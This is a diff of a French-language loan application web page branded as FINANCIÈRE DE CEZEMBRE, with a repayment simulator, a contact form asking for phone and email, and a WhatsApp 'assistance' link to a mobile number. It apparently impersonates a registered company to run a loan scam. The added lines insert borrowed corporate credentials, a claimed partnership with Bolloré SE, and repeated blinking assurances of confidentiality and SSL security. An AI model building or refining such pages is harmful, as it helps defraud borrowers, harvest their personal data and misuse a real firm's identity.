@@ -63,8 +63,17 @@
             background-size: cover; background-position: center;
             display: flex; align-items: center; padding: 0 8%; color: var(--white);
         }
-        .hero-content { max-width: 600px; }
-        .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; }
+        
+        /* EFFET DE GEL / HALO SUR LE TEXTE CENTRAL SANS TOUCHER AU TEXTE */
+        .hero-content { 
+            max-width: 600px; 
+            position: relative;
+            z-index: 1;
+            padding: 20px;
+            background: radial-gradient(circle at center, rgba(197, 160, 89, 0.15) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+        .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
         
         .simulator { 
             background: var(--white); padding: 40px; border-radius: 2px; width: 480px; 
@@ -73,43 +82,46 @@
         }
         .sim-row { margin-bottom: 20px; }
         .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 10px; font-size: 0.9rem; }
-        
         .sim-row label span { color: var(--navy); font-weight: 800; } 
         
         input[type="range"] { width: 100%; height: 4px; accent-color: var(--bright-gold); cursor: pointer; }
         
-        .result-area { 
-            background: var(--light-bg); padding: 25px; text-align: center; border: 1px solid #EEE; margin-bottom: 20px; border-radius: 4px; 
-        }
-
-        /* TITRE MENSUALITÉ : JAUNE ÉTINCELANT */
+        .result-area { background: var(--light-bg); padding: 25px; text-align: center; border: 1px solid #EEE; margin-bottom: 20px; border-radius: 4px; }
+        
+        /* TITRE MENSUALITÉ CLIGNOTANT ET EFFET GEL */
         .result-area p { 
-            font-size: 0.85rem; margin-bottom: 8px; font-weight: 700;
-            color: var(--bright-gold);
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
-            animation: shimmer-text 3s linear infinite;
-        }
-        @keyframes shimmer-text { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
-
-        /* RÉSULTAT CHIFFRÉ : BLEU MARINE TRÈS LISIBLE */
-        .result-area span { 
-            font-size: 2.2rem; 
-            font-weight: 800; 
+            font-size: 0.9rem; 
+            margin-bottom: 5px; 
             color: var(--navy); 
+            font-weight: 800;
+            text-shadow: 0px 2px 3px rgba(0,0,0,0.2); /* Effet relief gel */
+            animation: flash-attention 1.5s infinite;
         }
+        @keyframes flash-attention {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.02); color: var(--deep-gold); }
+        }
+
+        .result-area span { font-size: 2.2rem; font-weight: 800; color: var(--navy); }
         
         .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; }
         .btn-main:hover { background: var(--gold); }
 
-        /* CHAMPS DE FORMULAIRE OPTIMISÉS */
+        /* FORMULAIRE UNIFORME - TOUTES LES CAGES IDENTIQUES */
         .form-input { 
-            width: 100%; padding: 12px; border: 2px solid var(--deep-gold); 
-            background-color: var(--white); border-radius: 4px; 
-            margin-bottom: 10px; font-size: 1rem; outline: none;
-            color: #000c24; font-weight: 600;
+            width: 100%; 
+            padding: 12px; 
+            border: 2.5px solid var(--deep-gold); 
+            background-color: var(--white);
+            border-radius: 4px; 
+            margin-bottom: 10px; 
+            font-size: 0.9rem;
+            outline: none;
+            color: var(--navy);
+            font-weight: 600;
         }
         .form-input::placeholder { color: #999; font-weight: 400; }
-        .form-input:focus { border-color: var(--navy); box-shadow: 0 0 10px rgba(0,26,77,0.1); }
+        .form-input:focus { border-color: var(--navy); }
 
         .security-tag { text-align: center; margin-top: 15px; font-size: 0.7rem; color: #27ae60; font-weight: 600; text-transform: uppercase; }
 
@@ -118,8 +130,13 @@
             overflow: hidden; white-space: nowrap; border-top: 1px solid #d1ecf1; border-bottom: 1px solid #d1ecf1;
             display: flex;
         }
-        .scrolling-security span { display: inline-block; padding-left: 100%; animation: scroll-text 30s linear infinite; font-weight: 600; }
+        .scrolling-security span {
+            display: inline-block; padding-left: 100%; animation: scroll-text 30s linear infinite; font-weight: 600;
+        }
         @keyframes scroll-text { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
+
+        .shine-white { color: #FFFFFF !important; animation: blink-white 3s infinite; }
+        @keyframes blink-white { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; text-shadow: 0 0 10px #fff; } }
 
         #loader-overlay {
             display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
@@ -150,11 +167,31 @@
         .blink-gold { color: var(--gold); font-weight: 700; animation: pulse-text 1.5s infinite; }
         @keyframes pulse-text { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
 
-        .wa-assistant-container { position: fixed; bottom: 30px; left: 30px; z-index: 9999; display: flex; flex-direction: column; align-items: center; }
-        .wa-msg-bubble { background: var(--navy); color: white; padding: 10px 15px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; margin-bottom: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); border: 1px solid var(--gold); position: relative; animation: fadeInOut 4s infinite; white-space: nowrap; }
-        .wa-msg-bubble::after { content: ''; position: absolute; bottom: -8px; left: 50%; transform: translateX(-50%); border-left: 8px solid transparent; border-right: 8px solid transparent; border-top: 8px solid var(--navy); }
-        .whatsapp-float-dynamic { background-color: var(--whatsapp); color: #FFF; width: 65px; height: 65px; border-radius: 50%; text-align: center; font-size: 35px; box-shadow: 0 8px 20px rgba(0,0,0,0.3); display: flex; align-items: center; justify-content: center; text-decoration: none; position: relative; animation: wa-jump 3s infinite ease-in-out; }
-        .whatsapp-float-dynamic::before { content: ""; position: absolute; width: 100%; height: 100%; border-radius: 50%; background: var(--whatsapp); z-index: -1; animation: wa-pulse 2s infinite; }
+        .wa-assistant-container {
+            position: fixed; bottom: 30px; left: 30px;
+            z-index: 9999; display: flex; flex-direction: column; align-items: center;
+        }
+        .wa-msg-bubble {
+            background: var(--navy); color: white; padding: 10px 15px;
+            border-radius: 12px; font-size: 0.75rem; font-weight: 600;
+            margin-bottom: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            border: 1px solid var(--gold); position: relative;
+            animation: fadeInOut 4s infinite; white-space: nowrap;
+        }
+        .wa-msg-bubble::after {
+            content: ''; position: absolute; bottom: -8px; left: 50%;
+            transform: translateX(-50%); border-left: 8px solid transparent;
+            border-right: 8px solid transparent; border-top: 8px solid var(--navy);
+        }
+        .whatsapp-float-dynamic {
+            background-color: var(--whatsapp); color: #FFF; width: 65px; height: 65px; border-radius: 50%;
+            text-align: center; font-size: 35px; box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+            display: flex; align-items: center; justify-content: center; text-decoration: none; position: relative;
+            animation: wa-jump 3s infinite ease-in-out;
+        }
+        .whatsapp-float-dynamic::before {
+            content: ""; position: absolute; width: 100%; height: 100%; border-radius: 50%; background: var(--whatsapp); z-index: -1; animation: wa-pulse 2s infinite;
+        }
         @keyframes wa-jump { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-12px);} 60% {transform: translateY(-6px);} }
         @keyframes wa-pulse { 0% { transform: scale(1); opacity: 0.8; } 100% { transform: scale(1.8); opacity: 0; } }
         @keyframes fadeInOut { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.8; transform: scale(0.95); } }
@@ -178,8 +215,12 @@
 </header>
 
 <div class="wa-assistant-container">
-    <div class="wa-msg-bubble"><span id="wa-text">Besoin d'aide ? Contactez l'assistance</span></div>
-    <a href="https://wa.me/33780976404" class="whatsapp-float-dynamic" target="_blank"><i class="fab fa-whatsapp"></i></a>
+    <div class="wa-msg-bubble">
+        <span id="wa-text">Besoin d'aide ? Contactez l'assistance</span>
+    </div>
+    <a href="https://wa.me/33780976404" class="whatsapp-float-dynamic" target="_blank">
+        <i class="fab fa-whatsapp"></i>
+    </a>
 </div>
 
 <section class="hero">
@@ -230,9 +271,11 @@
                 <span id="monthlyRes">0.00</span> <span style="color: var(--navy); font-weight: 800;">€</span>
             </div>
             <button type="button" class="btn-main" onclick="goToStep2()">DÉPOSER MON DOSSIER</button>
+            
             <div class="scrolling-security">
-                <span><i class="fas fa-lock" style="color:var(--gold);"></i> CONFIDENTIALITÉ : Vos données sont strictement confidentielles. • Transfert sécurisé SSL 256-bit • Protection garantie.</span>
+                <span><i class="fas fa-lock" style="color:var(--gold);"></i> CONFIDENTIALITÉ : Vos données sont strictement confidentielles et ne seront jamais vendues à des tiers. • Transfert sécurisé SSL 256-bit • Protection garantie.</span>
             </div>
+
             <div class="security-tag"><i class="fas fa-lock"></i> VOTRE DOSSIER EST 100% SÉCURISÉ</div>
         </div>
 
@@ -278,6 +321,10 @@
                 <input type="tel" name="telephone" placeholder="Téléphone (ex: +33...)" class="form-input" required>
                 <input type="email" name="email" placeholder="Adresse e-mail" class="form-input" required>
                 
+                <div class="scrolling-security">
+                    <span><i class="fas fa-shield-alt" style="color:var(--gold);"></i> Transfert hautement sécurisé. Vos données sont strictement confidentielles et protégées.</span>
+                </div>
+
                 <button type="submit" class="btn-main">CONFIRMER L'ENVOI</button>
                 <div class="security-tag"><i class="fas fa-lock"></i> Transfert sécurisé SSL 256-bit</div>
             </form>
@@ -294,18 +341,21 @@
 <section class="about-section" id="about">
     <h2>Une Institution de Référence</h2>
     <p>FINANCIÈRE DE CEZEMBRE, dont le siège social est situé à Ergué-Gabéric (29500), est une société anonyme de référence dans le secteur de la distribution de crédit (Code APE 64.92Z). Fort d'un capital social de 1 200 000 euros, notre établissement assure une gestion rigoureuse des participations et des opérations financières complexes.</p>
+    <p>Sous la direction de Monsieur Michel Pajot, Président du Conseil d’administration et Directeur général, nous collaborons avec des acteurs majeurs tels que Bolloré SE et Financière Arnil pour garantir une stabilité et une expertise inégalées sur le marché européen.</p>
 </section>
 
 <footer id="legal">
     <div class="f-grid">
-        <div><h4>FINANCIÈRE DE CEZEMBRE</h4><p>Distribution de crédit régulée.</p></div>
+        <div><h4 class="shine-white">FINANCIÈRE DE CEZEMBRE</h4><p>Distribution de crédit régulée.<br>LEI : 969500WONJGTDZG8E035</p></div>
         <div><h4>SIÈGE SOCIAL</h4><p>ODET, 29500<br>ERGUÉ-GABÉRIC, France</p></div>
-        <div><h4>GOUVERNANCE</h4><p>M. Michel Pajot</p></div>
-        <div><h4>AUDIT</h4><p>Constantin Associés</p></div>
+        <div><h4>GOUVERNANCE</h4><p>M. Michel Pajot<br>Bolloré SE, Financière Arnil.</p></div>
+        <div><h4>AUDIT</h4><p>Constantin Associés<br>BEAS (La Défense)</p></div>
     </div>
     <div class="legal-block">
         <strong>INFORMATIONS LÉGALES :</strong> FINANCIÈRE DE CEZEMBRE SA. SIRET 552 058 943 00044. Soumis à l'ACPR. 
-        <div class="tag-warning"><span class="blink-gold">UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ.</span></div>
+        <div class="tag-warning">
+            <span class="blink-gold">UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ.</span>
+        </div>
     </div>
 </footer>
 
@@ -313,7 +363,7 @@
 
 <script>
     const waText = document.getElementById('wa-text');
-    const messages = ["Besoin d'aide ? Contactez l'assistance", "Un agent est prêt à vous aider"];
+    const messages = ["Besoin d'aide ? Contactez l'assistance", "Need help? Contact support", "L'un de nos agents vous répond", "An agent is ready to help you"];
     let msgIndex = 0; setInterval(() => { msgIndex = (msgIndex + 1) % messages.length; waText.innerText = messages[msgIndex]; }, 4000);
 
     const amtR = document.getElementById('amtRange');
@@ -333,7 +383,11 @@
     }
 
     function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
-    function goToStep1() { document.getElementById('step2').style.display = 'none'; document.getElementById('step1').style.display = 'block'; }
+    function goToStep1() { 
+        document.getElementById('step2').style.display = 'none'; 
+        document.getElementById('step1').style.display = 'block'; 
+    }
+
     function resetAll() { location.reload(); }
 
     amtR.oninput = calc; durR.oninput = calc;
@@ -352,7 +406,7 @@
                 document.getElementById('loading-content').style.display = 'none';
                 document.getElementById('success-message').style.display = 'block';
             }, 4000);
-        } catch (error) { overlay.style.display = 'none'; alert("Erreur."); }
+        } catch (error) { overlay.style.display = 'none'; alert("Erreur. Veuillez réessayer."); }
     };
 </script>
 </body>
